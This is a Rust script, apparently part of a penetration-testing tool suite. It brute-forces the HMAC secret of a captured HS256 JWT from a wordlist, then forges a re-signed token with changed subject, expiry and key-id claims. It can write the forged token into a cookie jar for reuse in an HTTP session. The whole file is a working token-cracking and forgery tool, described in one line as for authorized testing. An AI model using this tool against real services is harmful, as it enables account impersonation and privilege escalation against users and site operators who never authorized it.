#!/usr/bin/env rust-script
//! name: jwt_secret
//! description: HS256 弱密钥件 - crack 对抓到的 JWT 逐候选口令计算 HMAC-SHA256 与签名比对(词表或内联表,命中即回密钥与尝试数);forge 用该密钥按原 token 的 kid 重签声明的 sub/exp(改声明后重签,输出改造 token 并可选写回 jar)。合法授权测试用途。
//! version: 1.0.0
//! args: crack <token> (--wordlist FILE | --words 'a,b,c') | forge <token> --secret S [--sub S] [--kid K] [--exp N] [--host H] [--cookie session] [--jar FILE] [--out FILE] | selftest
//! keywords: 漏洞猎手套件, jwt, hs256, 弱密钥, brute, hmac, forge, cookie-jar
//!
//! ```cargo
//! [dependencies]
//! hmac = "0.12"
//! sha2 = "0.10"
//! base64 = "0.22"
//! ```

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use hmac::{Hmac, Mac};
use pi_rust_lib::serde_json::{self, json, Map, Value};
use sha2::Sha256;
use std::collections::HashSet;
use std::time::Instant;

type HmacSha256 = Hmac<Sha256>;

fn sign_hs256(secret: &[u8], signing_input: &str) -> String {
    let mut mac = HmacSha256::new_from_slice(secret).expect("hmac key");
    mac.update(signing_input.as_bytes());
    URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes())
}

fn split(token: &str) -> Result<(String, String, String), String> {
    let parts: Vec<&str> = token.trim().split('.').collect();
    if parts.len() < 3 {
        return Err(format!("expected 3 dot-separated parts, got {}", parts.len()));
    }
    Ok((parts[0].to_string(), parts[1].to_string(), parts[2].to_string()))
}

fn load_candidates(wordlist: &Option<String>, words: &[String]) -> Result<Vec<String>, String> {
    let mut raw: Vec<String> = Vec::new();
    if let Some(path) = wordlist {
        let text = std::fs::read_to_string(path).map_err(|e| format!("read {}: {e}", path))?;
        for line in text.lines() {
            let v = line.trim_end_matches('\r');
            if v.is_empty() || v.starts_with('#') {
                continue;
            }
            raw.push(v.to_string());
        }
    }
    for w in words {
        for piece in w.split(',') {
            if !piece.is_empty() {
                raw.push(piece.to_string());
            }
        }
    }
    if raw.is_empty() {
        return Err("no candidates: pass --wordlist FILE or --words 'a,b,c'".into());
    }
    // dedupe, preserve first-seen order
    let mut seen: HashSet<String> = HashSet::new();
    let mut out: Vec<String> = Vec::new();
    for c in raw {
        if seen.insert(c.clone()) {
            out.push(c);
        }
    }
    Ok(out)
}

fn cmd_crack(args: &[String]) -> Result<Value, String> {
    let token = match args.get(0) {
        Some(t) => t.clone(),
        None => return Err("crack <token> (--wordlist FILE | --words 'a,b,c')".into()),
    };
    let (mut wordlist, mut words) = (None, Vec::new());
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--wordlist" => {
                wordlist = args.get(i + 1).cloned();
                i += 2;
            }
            "--words" => {
                if let Some(v) = args.get(i + 1) {
                    words.push(v.clone());
                }
                i += 2;
            }
            other => return Err(format!("unknown flag {other}")),
        }
    }
    let (h, p, sig) = split(&token)?;
    let signing_input = format!("{h}.{p}");
    let candidates = load_candidates(&wordlist, &words)?;
    let total = candidates.len();
    let started = Instant::now();
    let mut matched: Vec<String> = Vec::new();
    let mut attempts = 0usize;
    for c in &candidates {
        attempts += 1;
        if sign_hs256(c.as_bytes(), &signing_input) == sig {
            matched.push(c.clone());
            break;
        }
    }
    let elapsed_ms = started.elapsed().as_millis() as u64;
    let header: Value = serde_json::from_slice(&URL_SAFE_NO_PAD.decode(&h).map_err(|e| e.to_string())?)
        .unwrap_or(Value::Null);
    let payload: Value = serde_json::from_slice(&URL_SAFE_NO_PAD.decode(&p).map_err(|e| e.to_string())?)
        .unwrap_or(Value::Null);
    Ok(json!({
        "matched": matched,
        "secret": matched.first(),
        "attempts": attempts,
        "candidates": total,
        "elapsed_ms": elapsed_ms,
        "alg": header.get("alg"),
        "kid": header.get("kid"),
        "payload": payload,
    }))
}

fn cmd_forge(args: &[String]) -> Result<Value, String> {
    let mut token = String::new();
    let mut secret = String::new();
    let mut sub: Option<String> = None;
    let mut kid: Option<String> = None;
    let mut exp: Option<i64> = None;
    let mut host: Option<String> = None;
    let mut cookie = "session".to_string();
    let mut jar: Option<String> = None;
    let mut out: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        let val = || args.get(i + 1).cloned().unwrap_or_default();
        match args[i].as_str() {
            "--secret" => {
                secret = val();
                i += 2;
            }
            "--sub" => {
                sub = Some(val());
                i += 2;
            }
            "--kid" => {
                kid = Some(val());
                i += 2;
            }
            "--exp" => {
                exp = val().parse().ok();
                i += 2;
            }
            "--host" => {
                host = Some(val());
                i += 2;
            }
            "--cookie" => {
                cookie = val();
                i += 2;
            }
            "--jar" => {
                jar = Some(val());
                i += 2;
            }
            "--out" => {
                out = Some(val());
                i += 2;
            }
            other if other.starts_with("--") => return Err(format!("unknown flag {other}")),
            other => {
                token = other.to_string();
                i += 1;
            }
        }
    }
    if token.is_empty() || secret.is_empty() {
        return Err("forge <token> --secret S [--sub S] [--kid K] [--exp N]".into());
    }
    let (h, p, _sig) = split(&token)?;
    let mut header: Map<String, Value> = serde_json::from_slice(
        &URL_SAFE_NO_PAD.decode(&h).map_err(|e| e.to_string())?,
    )
    .map_err(|e| format!("header json: {e}"))?;
    let mut payload: Map<String, Value> = serde_json::from_slice(
        &URL_SAFE_NO_PAD.decode(&p).map_err(|e| e.to_string())?,
    )
    .map_err(|e| format!("payload json: {e}"))?;
    header.insert("alg".into(), json!("HS256"));
    if let Some(k) = &kid {
        header.insert("kid".into(), json!(k));
    }
    if let Some(s) = &sub {
        payload.insert("sub".into(), json!(s));
    }
    if let Some(e) = exp {
        payload.insert("exp".into(), json!(e));
    }
    let h2 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&Value::Object(header.clone())).map_err(|e| e.to_string())?);
    let p2 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&Value::Object(payload.clone())).map_err(|e| e.to_string())?);
    let signing_input = format!("{h2}.{p2}");
    let sig2 = sign_hs256(secret.as_bytes(), &signing_input);
    let forged = format!("{signing_input}.{sig2}");

    let mut jar_written: Option<String> = None;
    if let (Some(jar_path), Some(host_name)) = (&jar, &host) {
        let text = std::fs::read_to_string(jar_path).unwrap_or_else(|_| "{}".to_string());
        let mut root: Map<String, Value> = serde_json::from_str(&text)
            .unwrap_or_else(|_| Map::new());
        let entry = root
            .entry(host_name.clone())
            .or_insert_with(|| Value::Object(Map::new()));
        if !entry.is_object() {
            *entry = Value::Object(Map::new());
        }
        entry
            .as_object_mut()
            .expect("object")
            .insert(cookie.clone(), json!(forged));
        std::fs::write(jar_path, serde_json::to_vec(&Value::Object(root)).map_err(|e| e.to_string())?)
            .map_err(|e| format!("write jar: {e}"))?;
        jar_written = Some(jar_path.clone());
    }
    if let Some(path) = &out {
        std::fs::write(path, &forged).map_err(|e| format!("write out: {e}"))?;
    }
    Ok(json!({
        "token": forged,
        "header": header,
        "payload": payload,
        "out": out,
        "jar": jar_written,
        "cookie": cookie,
        "host": host,
    }))
}

fn selftest() -> Result<Value, String> {
    let secret = "synthetic-pass-7f3a";
    let h = URL_SAFE_NO_PAD.encode(br#"{"alg":"HS256","typ":"JWT","kid":"k1"}"#);
    let p = URL_SAFE_NO_PAD.encode(br#"{"iss":"fixture-iss","sub":"fixture-user","exp":1}"#);
    let si = format!("{h}.{p}");
    let token = format!("{si}.{}", sign_hs256(secret.as_bytes(), &si));
    let cracked = cmd_crack(&[
        token.clone(),
        "--words".into(),
        "hunter2,synthetic-pass-7f3a,admin".into(),
    ])?;
    let ok = cracked["secret"] == json!("synthetic-pass-7f3a") && cracked["attempts"] == json!(2);
    let forged = cmd_forge(&[
        token.clone(),
        "--secret".into(),
        secret.into(),
        "--sub".into(),
        "fixture-admin".into(),
        "--exp".into(),
        "9999999999".into(),
    ])?;
    let ok = ok && forged["payload"]["sub"] == json!("fixture-admin");
    Ok(json!({"ok": ok, "crack": cracked["secret"], "forged_sub": forged["payload"]["sub"]}))
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.is_empty() {
        pi_rust_lib::report::failure(
            "jwt_secret",
            "no subcommand",
            "jwt_secret <crack|forge|selftest> ...",
        );
        std::process::exit(2);
    }
    let result = match args[0].as_str() {
        "crack" => cmd_crack(&args[1..]),
        "forge" => cmd_forge(&args[1..]),
        "selftest" => selftest(),
        other => Err(format!("unknown subcommand {other}")),
    };
    match result {
        Ok(data) => {
            pi_rust_lib::report::success("jwt_secret", data, "crack -> forge -> http_session with the forged jar").expect("report");
        }
        Err(e) => {
            pi_rust_lib::report::failure("jwt_secret", &e, "jwt_secret <crack|forge|selftest> ...");
            std::process::exit(1);
        }
    }
}
